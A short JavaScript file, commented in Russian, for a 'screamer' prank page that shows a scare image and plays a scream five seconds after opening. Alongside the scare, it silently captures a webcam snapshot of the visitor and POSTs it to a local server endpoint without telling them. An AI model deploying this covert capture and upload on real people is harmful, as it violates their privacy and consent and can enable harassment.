const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const screamer = document.getElementById("screamer");

navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
    video.srcObject = stream;
});

// Запускаем скример через 5 секунд
setTimeout(() => {
    screamer.style.display = "block"; // Показываем скример
    captureImage(); // Делаем снимок
    playScreamSound(); // Включаем звук
}, 5000);

function captureImage() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = canvas.toDataURL("image/png");
    sendToServer(imageData);
}

function sendToServer(imageData) {
    fetch("http://localhost:3000/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image: imageData })
    });
}

function playScreamSound() {
    const audio = new Audio("scream.mp3");
    audio.play();
}
